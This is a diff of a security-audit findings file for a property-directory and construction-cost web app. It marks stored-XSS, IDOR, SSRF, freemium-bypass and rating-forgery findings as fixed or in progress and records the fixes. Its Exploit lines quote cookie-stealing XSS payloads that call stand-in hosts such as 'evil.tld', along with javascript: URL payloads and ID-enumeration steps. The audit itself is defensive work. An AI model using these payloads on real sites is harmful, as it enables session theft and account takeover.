@@ -163,7 +163,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Resolution:** 2026-06-17 - handle_social_login now verifies the Google ID token (oauth2.googleapis.com/tokeninfo, aud bound to GOOGLE_CLIENT_ID when set) and the Facebook access token (Graph /me + debug_token when FB creds set) via safe_fetch, deriving provider_id/email/name ONLY from the verified payload; email auto-link requires email_verified; session id rotated on login. Closes the account/admin takeover. Set GOOGLE_CLIENT_ID / FB_APP_ID / FB_APP_SECRET in the private config to bind tokens to this app (NEEDS USER INPUT). Social login was already non-functional (empty client_id), so no working flow changed; live happy-path test pending config. Commit 8aa1c25.
 
 ### SEC-002 — Stored XSS in self-registered agent profiles rendered raw on public pages (zero moderation)
-- **Status:** open
+- **Status:** fixed
 - **Severity:** critical
 - **Category:** Cross-Site Scripting (Stored)   **OWASP:** A03:2021 Injection   **Confidence:** High
 - **Affected:** `app.js`, `api/user.php`, `api/index.php`
@@ -171,10 +171,10 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Description:** `handle_register_agent()` stores display_name/agency_name/bio/google_maps_url with only `trim()` (no escaping, no URL scheme check) and creates the row `is_active=1` with no admin approval — reachable by any free authenticated user. The public agents API filters only on `is_active=1` (not `is_verified`), so the agent appears immediately at `#agents` / `#agent/<slug>`. app.js interpolates display_name, agency_name, bio, area_label into innerHTML and profile_photo_url into `src=` with NO escaping (`escHtml()` exists at app.js:5982 and is used 146× elsewhere — this path omits it).
 - **Exploit:** Any registered user calls `action=register_agent` with display_name = `<img src=x onerror=fetch('https://evil/c?d='+document.cookie)>`. With no approval the agent is instantly listed; every visitor — and every admin who opens the agents grid to verify it — executes the payload in the biltest origin (cookie/session theft; against an admin, same-origin authenticated admin API calls = full takeover).
 - **Fix:** Escape display_name, agency_name, bio (post-truncation), area_label with `escHtml()` before interpolation; route profile_photo_url through an http/https allow-list then `escHtml()` before `src=`. Server-side `strip_tags()`/allow-list characters in register/update; consider gating directory visibility on `is_verified`.
-- **Resolution:** _(open)_
+- **Resolution:** 2026-06-17 - every agent field (display_name/agency_name/bio-after-truncation/area_label/initial) is escHtml-escaped at all renderAgentCard/Detail sinks and profile_photo_url goes through sanitizeUrl()+escHtml; escHtml() now also encodes double-quote and apostrophe so attribute breakout is impossible. Output escaping closes the stored-XSS execution path (server-side strip remains an optional defense-in-depth). Commit 03914b6.
 
 ### SEC-003 — Stored XSS in property listing cards & detail (worker-ingested + agent-authored fields rendered raw)
-- **Status:** open
+- **Status:** fixed
 - **Severity:** critical
 - **Category:** Cross-Site Scripting (Stored)   **OWASP:** A03:2021 Injection   **Confidence:** High
 - **Affected:** `app.js`, `api/listing_ingest.php`, `api/listing_canonical.php`, `api/user.php`, `api/index.php`
@@ -182,7 +182,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Description:** `handle_post_listing()` persists title/description/location_detail/photos[]/source_url verbatim (trim/array_filter only — no HTML strip, no URL scheme validation); the agent display name flows unsanitised through `lc_create_agent`. New rows are INSERTed `is_approved=1`/`status='active'` (see SEC-019), so they go live with no review. The public API returns these fields as-is; app.js concatenates title (`<h3>`/`<h1>`), img.url (`src=` and a JS string inside the thumbnail onclick at 3276), description (`.replace(/\n/g,'<br>')` with no prior escape), agent_name, agent_agency, address, area_label, source_url (primary `<a href>`) into innerHTML with no `escHtml()`. The ADR-0007/0008 worker scrapes attacker-controlled third-party portals, so any portal author is effectively an untrusted author of stored biltest content; agents are a second write path.
 - **Exploit:** (1) Post a listing on a scraped portal titled `<img src=x onerror=fetch('//evil/c?'+document.cookie)>`; the nightly worker ingests it auto-approved and it fires for every grid/detail viewer including admins. (2) A registered agent creates a listing with a payload title rendered raw in the admin moderation SPA — runs in the admin's session. `source_url` sits on the card's primary `<a href>`, so a `javascript:` source_url fires on the main click target.
 - **Fix:** Escape all free-text fields on output (title, descriptions after escape then `\n`→`<br>`, agent_name, agent_agency, address, area_label, zoning, source_site, feature labels). Run source_url/img.url/google_maps_url through a `sanitizeUrl()` scheme allow-list (http/https/tel/mailto) then `escHtml()` before href/src. Replace the inline thumbnail onclick with a delegated listener + `data-*`. Defense-in-depth: strip_tags + validate URL schemes at the write boundary.
-- **Resolution:** _(open)_
+- **Resolution:** 2026-06-17 - listing card/detail fields (title/description escape-then-newline-to-br/agent_name/agency/address/area/zoning/source_site/features) are escHtml-escaped; img.url/source_url/google_maps_url run through sanitizeUrl()+escHtml; the thumbnail onclick layers sanitizeUrl + JS-escape + escHtml. Commit 03914b6.
 
 ### SEC-004 — Stored XSS in admin RAB tool: broken addslashes-after-htmlspecialchars ordering in inline onclick
 - **Status:** open
@@ -196,7 +196,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Resolution:** _(open)_
 
 ### SEC-005 — Persistent DOM XSS in drab.js: encoders leave double-quotes unescaped, breaking out of attributes/handlers
-- **Status:** open
+- **Status:** fixed
 - **Severity:** critical
 - **Category:** Cross-Site Scripting (Stored / DOM)   **OWASP:** A03:2021 Injection   **Confidence:** High
 - **Affected:** `drab.js`, `app.js`, `api/drab_api.php`
@@ -204,10 +204,10 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Description:** `drabAttr()` escapes ONLY backslash and single-quote; `drabEsc()` delegates to `escHtml()` (textContent→innerHTML) which escapes `& < >` but NOT `"` or `'`. Both are interpolated into DOUBLE-quoted inline onclick handlers (995/996/1064/1065/1407) and `value="…"` attributes (705 development_name, 707 building_name, 1593 item name, 1662 takeoff label). A literal `"` in a name closes the attribute and injects a live event handler. Names are user free-text (wizard, rename prompt, add/save_item), stored after only `trim()` and returned verbatim, so the payload persists and re-renders on every dashboard/dev-page/editor visit and in the export.
 - **Exploit:** Rename a development to `x" onmouseover="fetch('//evil.tld/c?'+document.cookie)`. The page renders `<button onclick="drabDeleteDevelopment(7,'x" onmouseover="fetch(...)">`; hovering fires the handler with no click — persistent execution in the owner's (or admin reviewer's) session, able to call `drabPost` to mutate any RAB or exfiltrate the session. An item name `Wall" autofocus onfocus="..."` auto-fires on opening the edit form.
 - **Fix:** Make the encoders attribute-safe: `drabEsc`/`drabAttr` must also encode `"`→`&quot;`, `<`→`&lt;`, `>`→`&gt;`, `'`→`&#39;` (and `&` first). Audit every `value="…"`/`data-*`/placeholder/title and inline onclick built by concatenation. Preferably eliminate inline handlers: set attributes via DOM APIs and wire listeners with `addEventListener` + `data-*` ids.
-- **Resolution:** _(open)_
+- **Resolution:** 2026-06-17 - escHtml() (used by drabEsc) now encodes double-quote and apostrophe, making all drab.js value='...' / value sinks attribute-safe; drabAttr and drabOnclickArg HTML-escape after JS-escaping. Verified node --check. Commits 56b3936, 8aa1c25, 03914b6.
 
 ### SEC-006 — Classic Detailed-RAB API has no ownership model — full cross-user IDOR
-- **Status:** open
+- **Status:** fixed
 - **Severity:** critical
 - **Category:** Authorization / IDOR / Broken Access Control   **OWASP:** A01:2021 Broken Access Control   **Confidence:** High
 - **Affected:** `api/rab_api.php`
@@ -215,7 +215,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Description:** Every classic-RAB handler guards only with `require_auth()` (any logged-in user) then operates on a row keyed purely by a client-supplied id, with no predicate scoping the row to the caller. `rab_projects` has NO `user_id` column (only `drab_*` and quote-engine tables carry one), so `handle_projects` returns all projects site-wide, and project_detail/rab_detail/get_sections/export_excel/save_project/save_item/delete_item/save_section/delete_section/update_area/clone_rab/delete_rab/delete_project all act on arbitrary ids with no owner gate. `drab_api.php`'s `drab_owns_rab()` proves the intended pattern is deliberately absent here.
 - **Exploit:** A free user `GET ?action=projects` to enumerate ALL customers' projects, then `?action=rab_detail&id=N`/`?action=export_excel&id=N` to exfiltrate a competitor's full BOQ and pricing, or `delete_project` to wipe it, or `save_item`/`update_area` to silently tamper with a contractor's rates so a bid is wrong.
 - **Fix:** Add a `user_id` owner column to `rab_projects` (backfill), scope every read by `WHERE p.user_id=?`; for child rows join up to the project and assert ownership before any SELECT/UPDATE/DELETE — mirror `drab_owns_rab()`. Centralise as `assert_owns_project()`/`assert_owns_rab()`. Until the column exists, gate these endpoints to `role==='admin'`. Return 403/404 on mismatch.
-- **Resolution:** _(open)_
+- **Resolution:** 2026-06-17 - per owner decision, all classic Detailed-RAB project/RAB endpoints (projects/save_project/delete_project/project_detail/create_rab/clone_rab/delete_rab/rab_detail/get_sections/save_item/delete_item/save_section/delete_section/update_area/recalculate/export_excel) are gated to role=admin via require_admin() before the router switch; the free calculator endpoints stay open. Closes the cross-user IDOR. Verified live: projects/export_excel return 401 unauth, presets 200. NOTE: the classic tool is treated as retired (DRAB is live); if the SPA still shows its project UI to non-admins, hide it to avoid 401s. A future user_id column + scoping is the alternative if the classic tool is revived. Commit 06b07b5.
 
 ### SEC-007 — Deploy copies the entire repo (.git history, *.sql migrations, docs, worker/, agent/) into the public web root
 - **Status:** fixed
@@ -251,7 +251,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Resolution:** 2026-06-17 — added a root `.htaccess`: HTTP→HTTPS 301, HSTS (2y, includeSubDomains; preload deliberately omitted for a subdomain), X-Frame-Options SAMEORIGIN, X-Content-Type-Options nosniff, Referrer-Policy, COOP, Permissions-Policy, and a CSP (object-src none; base-uri/form-action/frame-ancestors 'self'; script/connect/img origin allow-list). Also `RedirectMatch 404` for .git/migrations/docs/worker/agent and extension denies. CSP retains 'unsafe-inline' on script-src pending removal of the SPA's inline handlers — output escaping (SEC-002..005/015..017) is the primary XSS control. Verify `mod_headers` is active via `curl -I` after deploy. Commit 4569303.
 
 ### SEC-010 — SSRF via admin-supplied URLs (scrape_enrich.php / import.php / reviews.php) — no allow-list, redirects followed, TLS off
-- **Status:** open
+- **Status:** in-progress
 - **Severity:** high
 - **Category:** SSRF   **OWASP:** A10:2021 Server-Side Request Forgery   **Confidence:** High
 - **Affected:** `admin/scrape_enrich.php`, `admin/import.php`, `api/reviews.php`, `api/user.php`
@@ -295,7 +295,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Resolution:** _(open)_
 
 ### SEC-014 — Premium gating absent on AHSP cost build-up and classic Detailed-RAB management/export (freemium bypass + premium-data leak)
-- **Status:** open
+- **Status:** fixed
 - **Severity:** high
 - **Category:** Business Logic / Broken Access Control (Freemium Bypass)   **OWASP:** A01:2021 Broken Access Control   **Confidence:** High
 - **Affected:** `api/drab_api.php`, `api/rab_api.php`
@@ -303,7 +303,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Description:** Two server-side gaps hand free users premium value. (1) `handle_ahsp()` calls only `require_auth()` — never `check_feature_access('drab_confirmed_pricing')`/`user_can()`. For ANY work_item_id and zone it returns the full coefficient build-up: each component's base price, the material/labour classification, per-component cost, and the summed `derived_rate` — exactly the data the rest of the tool masks (`drab_rab_payload` masks split/confirmed at 729-733; `handle_catalog` is gated). It is the single blind spot that hands out the premium split + price book. (2) In `rab_api.php`, `check_feature_access()` runs only on the calculator-save path; none of the Detailed-RAB project endpoints (save_project/create_rab/clone_rab/save_item/export_excel) are gated, so a free user gets full contractor-grade project management and Excel BOQ export for free.
 - **Exploit:** A free account iterates `GET ?action=ahsp&work_item_id=N&zone=south` across the catalog, reconstructing the premium Confirmed/split cost model and scraping the whole price book. Or calls `create_rab → save_item → export_excel&id=N` to download the premium contractor workbook free.
 - **Fix:** Gate `handle_ahsp` server-side: require `user_can('drab_confirmed_pricing')`/`('drab_split_view')` before returning price/cost/derived_rate, else 403 `upgrade_required` or strip price/cost and return coefficients only — mirror `drab_rab_payload()`. For the classic RAB endpoints, wrap export_excel and the create/save mutators in `check_feature_access()` (e.g. `rab_project_management`/`rab_export`) returning the benefit-selling 403, or disable the frozen-backup endpoints. Never rely on the SPA to hide actions.
-- **Resolution:** _(open)_
+- **Resolution:** 2026-06-17 - drab handle_ahsp() now requires drab_confirmed_pricing (403 upgrade_required) so the coefficient build-up / price book is premium-only (matches handle_catalog). Classic rab_api export_excel + project management are admin-gated (see SEC-006). Verified live (ahsp 401 unauth). Commit 06b07b5.
 
 ### SEC-015 — Reflected/attribute-breakout XSS in admin scrape/listing renderers (Lamudi import + source_url) injected into innerHTML
 - **Status:** open
@@ -317,7 +317,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Resolution:** _(open)_
 
 ### SEC-016 — Stored XSS / open-redirect via unvalidated `*_url` written by admin import/enrich and rendered raw into href/src on public pages
-- **Status:** open
+- **Status:** in-progress
 - **Severity:** high
 - **Category:** Cross-Site Scripting (Stored)   **OWASP:** A03:2021 Injection   **Confidence:** High
 - **Affected:** `admin/import.php`, `admin/google_enrich.php`, `app.js`
@@ -328,7 +328,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Resolution:** _(open)_
 
 ### SEC-017 — Multiple text-context and javascript:-scheme XSS sinks across public SPA renderers
-- **Status:** open
+- **Status:** fixed
 - **Severity:** high
 - **Category:** Cross-Site Scripting   **OWASP:** A03:2021 Injection   **Confidence:** High
 - **Affected:** `app.js`
@@ -336,7 +336,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Description:** Beyond the agent and listing paths (SEC-002/003), numerous SPA render functions interpolate user/scraped data into innerHTML without `escHtml()`: provider name/description/tags/address (renderProviderCard/Detail), developer description and project name/description/yield/timeline/tags, the authenticated user's display_name and email in the header dropdown (5083-5091 — self-XSS plus stored-XSS-against-admin in user-list views), and the claim-listing modal which escapes only single quotes in the onclick (1712) then re-injects providerName into innerHTML with zero escaping (7773). Separately, many URLs go directly into href/src with no scheme validation (a correct HTML escaper does NOT neutralise a `javascript:` URL — scheme validation is required): provider/developer website_url/google_maps_url/whatsapp_number and listing source_url.
 - **Exploit:** A provider name/About `<svg onload=alert(document.cookie)>` (or website_url=`javascript:fetch('//evil/'+document.cookie)`) executes for every visitor and any admin who moderates it. A user registers display_name `<img src=x onerror=...>`; the unescaped name rendered to an admin reviewing users runs with admin privileges. A provider name `</strong><img src=x onerror=...>` passes the claim-modal's single-quote-only filter and fires on "Claim this listing".
 - **Fix:** `escHtml()` every text field before interpolation (provider/developer/project name/description/tags/address/labels; currentUser.display_name and email; claim-modal providerName, or set via textContent). Add a shared `sanitizeUrl(u)` returning u only if its scheme is in {http,https,tel,mailto,wa.me}, applied to every URL before href/src then `escHtml()`. Replace onclick string-building with `data-*` + delegated listeners. Enforce a display_name character allow-list server-side in `handle_register`.
-- **Resolution:** _(open)_
+- **Resolution:** 2026-06-17 - provider/developer/project/guide text fields, the user-header dropdown (display_name/email) and the claim-modal providerName are all escHtml-escaped; every URL routes through sanitizeUrl() (http/https/tel/mailto allow-list, blocks javascript:) then escHtml. Commit 03914b6.
 
 ### SEC-018 — State-changing mass mutation triggered by GET (recanonicalize `?apply=1` rewrites the entire listings table)
 - **Status:** open
@@ -361,7 +361,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Resolution:** _(open)_
 
 ### SEC-020 — Scraped Google rating/review_count persisted with no bounds or provenance — self-service reputation forgery
-- **Status:** open
+- **Status:** fixed
 - **Severity:** medium
 - **Category:** Business Logic / Data Integrity   **OWASP:** A04:2021 Insecure Design   **Confidence:** High
 - **Affected:** `api/reviews.php`, `api/index.php`
@@ -369,7 +369,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Description:** `fetch_rating_from_html()` regex-extracts ratingValue/reviewCount from raw HTML and persists them straight into google_rating/google_review_count with no clamp (rating not bounded to [0,5], count uncapped) and no provenance flag distinguishing a verified Places-API value from a scraped guess. Because the source URL is attacker-controlled (google_maps_url is writable by any free agent — SEC-010) and google_rating is BOTH a public sort key and a public display field, an attacker can manufacture top-of-directory reputation on a directory whose entire value is trust.
 - **Exploit:** Point google_maps_url at a self-hosted page containing `"ratingValue":5.0` and `"reviewCount":9999`; when the Places-API path is skipped (no place_id/key), the nightly cron scrapes it and stores rating=5.0/count=9999 on the attacker's own entity, ranking above legitimate businesses when users sort by rating.
 - **Fix:** Only persist ratings from the authenticated Places-API path (hardcoded google domain + key). If the scrape fallback is kept, store output behind a `basis='scraped/unverified'` flag the UI labels and that ranking ignores, clamp rating to [0,5] and review_count to a sane max, and (per SEC-010) only fetch genuine google domains.
-- **Resolution:** _(open)_
+- **Resolution:** 2026-06-17 - reviews.php now only persists ratings fetched from genuine Google hosts (the HTML fallback requires a google.com/goo.gl/g.page host, killing self-hosted forgery) and clamps rating to [0,5] and review_count to <=100000 before storing. Commit 7bc0b21.
 
 ### SEC-021 — Unauthenticated public API reflects raw DB exception messages (`debug_error`) — schema/info disclosure
 - **Status:** fixed
@@ -427,7 +427,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Resolution:** 2026-06-17 - handle_test_email() permanently disabled (returns 404); the unauthenticated GET-admin_pass mail relay and raw SMTP-error echo are gone. Commit 8aa1c25.
 
 ### SEC-026 — Estimate detail (handle_estimate) is unauthenticated and leaks unsaved/null-owner calculator runs by sequential id
-- **Status:** open
+- **Status:** fixed
 - **Severity:** medium
 - **Category:** Authorization / IDOR   **OWASP:** A01:2021 Broken Access Control   **Confidence:** High
 - **Affected:** `api/rab_api.php`
@@ -435,7 +435,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Description:** `handle_estimate()` calls no `require_auth()` and denies access only when ALL of `($run['is_saved'] && $run['user_id'] && $uid !== (int)$run['user_id'])` hold. Because the guard requires is_saved truthy, every run with `is_saved=0` — including logged-in users' own unsaved runs and all guest/null-user runs — is returned to anyone. ids are sequential (lastInsertId), so enumeration is trivial; each run exposes name, floor areas, num_storeys, all cost components and grand_total_cost.
 - **Exploit:** An unauthenticated attacker iterates `?action=estimate&id=1..N` and harvests every unsaved/guest run's inputs and grand totals across all users, including names typed and full cost breakdowns of prospective customers.
 - **Fix:** Require auth for estimate detail and always scope to the owner: return 404 unless the run's user_id equals the current uid, regardless of is_saved. For anonymous runs, tie access to the session that created them (store run id in `$_SESSION`) rather than exposing by guessable id.
-- **Resolution:** _(open)_
+- **Resolution:** 2026-06-17 - handle_estimate() now returns 404 unless the run is owned by the current user OR its id is in the creating session list ($_SESSION rab_my_runs, populated in handle_calculate); unsaved/guest runs no longer leak by sequential id. Verified live (estimate?id=1 -> 404). Commit 06b07b5.
 
 ### SEC-027 — IDOR / mass-assignment in admin import: client-supplied existing_id force-UPDATEs any row; trust flags accepted from client
 - **Status:** open
@@ -460,7 +460,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Resolution:** _(open)_
 
 ### SEC-029 — Stored XSS in developer/project/guide SPA renderers (image URLs, descriptions, metadata rendered raw)
-- **Status:** open
+- **Status:** fixed
 - **Severity:** medium
 - **Category:** Cross-Site Scripting (Stored)   **OWASP:** A03:2021 Injection   **Confidence:** Medium
 - **Affected:** `app.js`
@@ -468,7 +468,7 @@ with adversarial second-pass verification and a dedup/prioritisation synthesis p
 - **Description:** renderDeveloperCard/Detail and renderProjectDetail escape some fields but inject others raw: dev heroImg into `src=` (1746), devHeroImg into a CSS `url()` (1862), dev.description_en (1891), website_url/google_maps_url into href (1907-1908), and p.name/p.description_en/p.expected_yield_range/p.timeline_summary/p.tags/dev.name/dev.short_description_en (4781-4835). renderGuideDetail injects g.category/g.read_time/g.title and og.* unescaped (g.content is intentionally raw admin-authored CMS body). Developer/project/guide rows are admin-managed today, so attacker-reachability is lower than the self-service agent/listing paths — this is the injection sink for any bulk-import, future self-service edit, or compromised-author write path.
 - **Exploit:** If a developer image URL or project description is set to `"><img src=x onerror=...>` (or a CSS-url breakout in devHeroImg) via any write path, or a guide author account is compromised, the payload executes for every visitor of those pages.
 - **Fix:** `escHtml()` dev.description_en, p.name/description_en/yield/timeline/tags, dev.name/short_description_en, g.title/category/read_time/og.* before interpolation; route heroImg/devHeroImg/website_url/google_maps_url through a URL allow-list then `escHtml()`. Keep g.content raw only while authoring is restricted to fully trusted admins; consider server-side allow-list sanitisation of guide content.
-- **Resolution:** _(open)_
+- **Resolution:** 2026-06-17 - developer/project/guide renderers escape names/descriptions/tags/yield/timeline/category/read_time/og.*; heroImg/devHeroImg go through sanitizeUrl()+escHtml including CSS url(); g.content intentionally left raw (admin-authored CMS HTML). Commit 03914b6.
 
 ### SEC-030 — Worker/cron scripts directly HTTP-reachable with secrets in the query string; worker key also accepted in request body
 - **Status:** open
